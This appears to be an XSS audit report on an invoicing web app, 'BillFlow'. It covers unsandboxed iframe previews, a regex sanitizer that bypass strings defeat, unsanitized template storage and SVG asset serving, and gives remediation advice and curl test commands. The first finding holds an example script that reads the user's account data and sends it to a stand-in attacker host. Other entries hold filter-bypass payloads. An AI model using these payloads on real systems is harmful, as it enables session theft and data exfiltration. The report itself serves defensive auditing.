# XSS Analysis Results: BillFlow

## Executive Summary
- Endpoints and components analyzed: 24
- Vulnerable: 3
- Likely Vulnerable: 1
- Not Vulnerable: 19
- Needs Manual Review: 1

## Findings

### [VULNERABLE] Missing Sandboxing on Template Preview iframes (Stored / DOM XSS)
- **File**: `components/TemplateEditor.tsx` (line 285), `components/TemplateCardActions.tsx` (line 86), `components/NewTemplateTabs.tsx` (lines 323, 682, 715), `components/BillForm.tsx` (line 1176)
- **Endpoint / function**: React UI components rendering template previews via `<iframe srcDoc={previewHtml} />`
- **Issue**: The application renders user-authored template HTML into `<iframe>` elements using the `srcDoc` attribute without setting a restrictive `sandbox` attribute (e.g., `sandbox="allow-same-origin"` or `sandbox=""`).
- **Taint trace**:
  1. An attacker creates or updates a bill template via `POST /api/templates` or `PUT /api/templates/[id]` containing malicious HTML/JavaScript (e.g. `<script>fetch('/api/auth/me').then(r=>r.json()).then(d=>fetch('//attacker.com/steal?data='+JSON.stringify(d)))</script>` or `<img src=x onerror=parent.postMessage(...)>`).
  2. The raw HTML is stored in the `Template.html` database column.
  3. When the user opens the template in the Template Editor, New Template gallery, or Bill creation form, `previewHtml` is requested via `GET/POST /api/templates/[id]/preview`.
  4. The client assigns `srcDoc={previewHtml}` to an un-sandboxed `<iframe>`.
  5. Because `sandbox` attribute is omitted, modern browsers execute script inside `srcDoc` within the application's origin, granting unrestricted access to `parent.document`, local cookies (non-httpOnly), localStorage/AsyncStorage, and all authenticated API routes via `parent.fetch()`.
- **Impact**: Execution of arbitrary JavaScript in the victim's browser session. Allows session hijacking, unauthorized bill/client creation/deletion, settings modification, and data exfiltration.
- **Remediation**:
  1. Add `sandbox="allow-modals"` (without `allow-scripts` or `allow-same-origin`) to all preview `<iframe>` tags:
     ```tsx
     <iframe title="preview" srcDoc={previewHtml} sandbox="" className="..." />
     ```
  2. Sanitize template HTML with DOMPurify on the client or server prior to rendering previews.
- **Dynamic Test**:
  ```bash
  # 1. Create a template with an embedded script payload
  curl -X POST http://localhost:3000/api/templates \
    -H "Cookie: bf_session=<SESSION_TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"name":"XSS Test","html":"<!DOCTYPE html><html><body><h1>Invoice</h1><script>alert(document.domain)</script></body></html>"}'
  # 2. View the template in TemplateEditor in the browser - alert(document.domain) executes.
  ```

### [VULNERABLE] Ineffective Regex-based Script Stripping in Imported Templates
- **File**: `lib/ai-media.ts` (lines 60-65), `app/api/templates/import/route.ts` (line 27)
- **Endpoint / function**: `stripScripts()` in `POST /api/templates/import`
- **Issue**: `stripScripts()` uses naive regular expressions to strip script tags and inline event handlers:
  ```ts
  export function stripScripts(html: string): string {
    return html
      .replace(/<script[\s\S]*?<\/script>/gi, "")
      .replace(/\son\w+\s*=\s*"[^"]*"/gi, "")
      .replace(/\son\w+\s*=\s*'[^']*'/gi, "");
  }
  ```
  This sanitizer fails to strip:
  1. Event handlers without quotation marks: `<img src=x onerror=alert(1)>`
  2. Event handlers with slash separators: `<svg/onload=alert(1)>`
  3. JavaScript URI schemes: `<iframe src="javascript:alert(1)">` or `<a href="javascript:alert(1)">`
  4. Non-matching or malformed script tags: `<script/x>alert(1)</script>`
- **Taint trace**:
  1. Attacker imports an `.html` file containing `<img src=x onerror=alert(1)>` via `POST /api/templates/import`.
  2. `stripScripts` leaves the payload completely intact.
  3. The malicious template is saved to the database.
- **Impact**: Stored Cross-Site Scripting when the template is edited, previewed, or rendered.
- **Remediation**: Replace custom regex sanitization with an established, production-tested HTML sanitizer like `sanitize-html` or `DOMPurify` (configured with an allowlist of safe formatting tags only).
- **Dynamic Test**:
  ```bash
  curl -X POST http://localhost:3000/api/templates/import \
    -H "Cookie: bf_session=<SESSION_TOKEN>" \
    -F "file=@malicious.html;type=text/html"
  # Where malicious.html contains: <img src=x onerror=alert(document.domain)>
  ```

### [VULNERABLE] Complete Lack of HTML Sanitization on Manual Template Creation
- **File**: `app/api/templates/route.ts` (lines 26-46), `app/api/templates/[id]/route.ts` (lines 32-53)
- **Endpoint / function**: `POST /api/templates`, `PUT /api/templates/[id]`
- **Issue**: `POST /api/templates` and `PUT /api/templates/[id]` accept arbitrary `html` strings directly from request body and store them in the database without invoking any sanitization (not even `stripScripts`). Any `<script>` tag or payload is persisted as-is.
- **Taint trace**:
  `req.json() -> body.html -> validateTemplateHtml (only checks Handlebars syntax) -> db.template.create({ data: { html } })`
- **Impact**: Allows persistence of arbitrary JavaScript within user templates.
- **Remediation**: Run input through server-side sanitization before storing in the database.
- **Dynamic Test**:
  ```bash
  curl -X POST http://localhost:3000/api/templates \
    -H "Cookie: bf_session=<SESSION_TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"name":"Unfiltered Template","html":"<html><body><script>alert(1)</script></body></html>"}'
  ```

### [LIKELY VULNERABLE] Arbitrary MIME Type and Missing Content-Disposition on Asset Serving
- **File**: `app/api/assets/route.ts` (line 38), `app/api/assets/[id]/route.ts` (lines 16-21)
- **Endpoint / function**: `GET /api/assets/[id]`
- **Issue**: `POST /api/assets` accepts arbitrary `file.type` supplied by the client without validation or restriction, saving it to `Asset.mimeType`. `GET /api/assets/[id]` serves the raw file back using `Content-Type: asset.mimeType` without setting `Content-Disposition: attachment` or `Content-Security-Policy: sandbox`.
- **Taint trace**:
  1. A user uploads an SVG file or HTML file with `Content-Type: image/svg+xml` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`.
  2. The server stores `mimeType: "image/svg+xml"`.
  3. When viewed in browser at `/api/assets/<assetId>`, the browser renders the SVG and executes the script under the application domain.
- **Impact**: Stored XSS under the application origin.
- **Remediation**:
  1. Enforce an allowlist of permitted MIME types (`image/png`, `image/jpeg`, `image/webp`).
  2. If SVG is allowed, strip scripts or serve with `Content-Disposition: attachment; filename="asset"` and header `Content-Security-Policy: default-src 'none'`.
- **Dynamic Test**:
  ```bash
  curl -X POST http://localhost:3000/api/assets \
    -H "Cookie: bf_session=<SESSION_TOKEN>" \
    -F "file=@test.svg;type=image/svg+xml"
  ```

### [NOT VULNERABLE] Standard React JSX Output Encoding
- **File**: `app/**`, `components/**`
- **Endpoint / function**: Web UI components
- **Reason**: All user data (bill numbers, client names, line items, notes) rendered into React components is rendered through JSX expressions (`{bill.clientName}`), which automatically escapes HTML entities by default.
